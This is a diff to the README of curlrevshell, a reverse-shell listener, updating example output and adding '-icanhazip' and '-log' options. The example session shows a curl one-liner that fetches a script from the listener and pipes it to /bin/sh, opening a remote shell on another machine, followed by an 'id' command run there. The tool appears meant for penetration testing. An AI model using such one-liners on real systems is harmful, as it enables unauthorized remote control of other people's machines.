@@ -29,12 +29,12 @@ Example
 It should look like the following, but with nicer colors:
 ```
 $ go install github.com/magisterquis/curlrevshell@latest
-go: downloading github.com/magisterquis/curlrevshell v0.0.1-beta.3
-go: downloading golang.org/x/net v0.22.0
-go: downloading golang.org/x/sync v0.6.0
-go: downloading golang.org/x/term v0.18.0
-go: downloading golang.org/x/tools v0.19.0
-go: downloading golang.org/x/sys v0.18.0
+go: downloading github.com/magisterquis/curlrevshell v0.0.1-beta.4
+go: downloading golang.org/x/net v0.24.0
+go: downloading golang.org/x/sync v0.7.0
+go: downloading golang.org/x/term v0.19.0
+go: downloading golang.org/x/tools v0.20.0
+go: downloading golang.org/x/sys v0.19.0
 go: downloading golang.org/x/text v0.14.0
 $ curlrevshell
 01:04:42.760 Listening on 0.0.0.0:4444
@@ -44,7 +44,9 @@ curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" h
 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
 
 01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
-01:04:55.259 [192.168.1.20] Got a shell: ID:zcj5vz3zp6ce
+01:04:55.259 [192.168.1.20] Input connected: ID:1jns1whwi1p1q
+01:04:55.259 [192.168.1.20] Output connected: ID:1jns1whwi1p1q
+01:04:55.259 [192.168.1.20] Shell is ready to go!
 > id
 01:05:10.753 uid=1000(you) gid=1000(you) groups=1000(you), 0(wheel), 117(dialer)
 ```
@@ -65,10 +67,14 @@ Options:
     	Additional callback address or domain, for one-liner printing (may be repeated)
   -callback-template template
     	Optional callback template file
+  -icanhazip
+    	Query icanhazip.com for a callback address
   -ipv6-one-liners
     	Also print callback one-liners with IPv6 addresses
   -listen-address address
     	Listen address (default "0.0.0.0:4444")
+  -log file
+    	Optional file to which to write JSON logs
   -no-timestamps
     	Don't print timestamps
   -print-default-template
